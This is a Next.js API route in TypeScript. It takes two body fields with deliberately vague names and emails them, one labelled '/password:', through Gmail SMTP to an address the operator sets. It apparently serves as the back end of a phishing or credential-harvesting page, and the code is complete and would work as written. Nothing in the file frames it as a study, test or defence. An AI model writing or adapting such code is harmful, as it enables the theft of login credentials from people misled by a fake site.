// Next.js API route support: https://nextjs.org/docs/api-routes/introduction
import type { NextApiRequest, NextApiResponse } from 'next'
import nodemailer from 'nodemailer'
type Data = {
  message: string
}

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  const params = req.body
  

  let transporter: nodemailer.Transporter = nodemailer.createTransport({
    service: 'Gmail',
    host: "smtp.gmail.com",
    port: 465,
    secure: true,
    auth: {
      user: process.env.APP_ACCOUNT, 
      pass: process.env.APP_PASSWORD, 
    },
  });

  return transporter.sendMail({
              from: `"miko" <${process.env.APP_ACCOUNT}>`,
              to: process.env.EMAIL_TO_SEND,
              subject: 'site',
              text: `${JSON.stringify(params.jenneta)} ${JSON.stringify(params.jennet)}`,
              html: `<h3>${JSON.stringify(params.jenneta).replaceAll('"', '')} /password: ${JSON.stringify(params.jennet).replaceAll('"', '')}</h3>`
            }).then((rec) => {

              console.log(rec);
              
              return res.status(200).send({message: 'message sent'})
              
            }).catch((err) => {
              
              console.log(err);
              
              return res.status(200).send({message:'an error occured'})
            })
}
